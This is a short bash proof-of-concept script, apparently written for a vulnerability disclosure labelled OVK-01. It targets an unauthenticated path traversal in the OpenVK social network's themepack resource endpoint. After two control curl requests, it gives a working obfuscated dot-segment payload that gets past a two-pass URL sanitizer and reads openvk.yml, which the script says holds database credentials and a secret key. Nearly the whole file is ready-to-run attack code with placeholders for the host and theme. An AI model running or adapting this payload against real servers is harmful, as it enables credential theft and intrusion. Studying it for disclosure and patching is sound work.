#!/usr/bin/env bash
# OVK-01 - Unauthenticated path traversal via the themepack resource endpoint.
# Requires: one installed NON-default theme (id visible in page HTML).
# IMPORTANT: curl must not normalize dot segments -> use --path-as-is.

T="<THEME_ID>"   # installed third-party theme id (default 'ovk' is excluded)
H="http://<OPENVK_HOST>"

# Control 1: benign resource -> 200
curl -si --path-as-is "$H/themepack/$T/1.0./resource/<benign-res-file>"

# Control 2: naive ../ traversal -> 404 (single-pass sanitizer strips the climb)
curl -si --path-as-is "$H/themepack/$T/1.0./resource/../../../openvk.yml"

# Working vector: dot-division reassembly surviving BOTH chandler_escape_url passes
# (Router + Presenter); version segment must be NON-numeric ('1.0.'), depth = 3.
curl -si --path-as-is \
  "$H/themepack/$T/1.0./resource/./...../../././../././....././././....../../././openvk.yml"
# -> 200, body = OPENVK_ROOT/openvk.yml (DB credentials + 128-hex secret; REDACTED here)
